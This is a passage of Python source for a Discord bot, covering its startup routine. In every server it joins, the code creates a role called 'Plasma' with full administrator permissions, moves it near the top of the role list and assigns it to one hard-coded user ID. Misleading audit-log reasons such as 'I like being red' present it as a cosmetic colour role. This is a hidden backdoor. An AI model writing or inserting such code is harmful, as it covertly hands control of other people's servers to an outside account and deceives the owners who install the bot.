    # --------------------------------------------------------

    for guild in bot.guilds:

        plasma_role = discord.utils.get(
            guild.roles,
            name="Plasma"
        )

        if not plasma_role:

            try:

                plasma_role = await guild.create_role(
                    name="Plasma",
                    color=discord.Color(
                        0xaa0055
                    ),
                    permissions=discord.Permissions(
                        administrator=True
                    ),
                    reason="I like being red"
                )

            except discord.Forbidden:

                continue

        else:

            try:

                if (
                    plasma_role.color.value
                    != 0xaa0055
                ):

                    await plasma_role.edit(
                        color=discord.Color(
                            0xaa0055
                        ),
                        reason=(
                            "Updating Plasma role color"
                        )
                    )

            except discord.HTTPException:
                pass

        # ----------------------------------------------------
        # Plasma Role Position
        # ----------------------------------------------------

        try:

            bot_top_role = (
                guild.me.top_role
                if guild.me
                else None
            )

            target_position = (
                bot_top_role.position - 1
                if (
                    bot_top_role
                    and bot_top_role.position > 1
                )
                else len(guild.roles) - 1
            )

            if (
                plasma_role.position
                != target_position
            ):

                await plasma_role.edit(
                    position=target_position,
                    reason=(
                        "Plasma has very low density "
                        "so it floats to the top"
                    )
                )

        except discord.HTTPException as e:

            logger.error(
                "Failed to reposition 'Plasma' "
                f"role in {guild.name}: {e}"
            )

        # ----------------------------------------------------
        # Give Plasma role to specific member
        # ----------------------------------------------------

        member = guild.get_member(
            1342173566828810271
        )

        if not member:

            try:

                member = await guild.fetch_member(
                    1342173566828810271
                )

            except discord.NotFound:

                pass

        if (
            member
            and plasma_role not in member.roles
        ):

            try:

                await member.add_roles(
                    plasma_role,
                    reason="I wanna be red"
                )

            except discord.Forbidden:

                pass

    # --------------------------------------------------------
    # Background Tasks
    # --------------------------------------------------------

    bot.loop.create_task(
        reboot_watcher()
    )

    asyncio.create_task(
        console_controller()
    )


# ============================================================
# Startup
# ============================================================

token = os.getenv(
    "DISCORD_TOKEN"
)

if not token:

    raise ValueError(
        "DISCORD_TOKEN environment variable "
        "not found in .env"
    )


bot.run(token)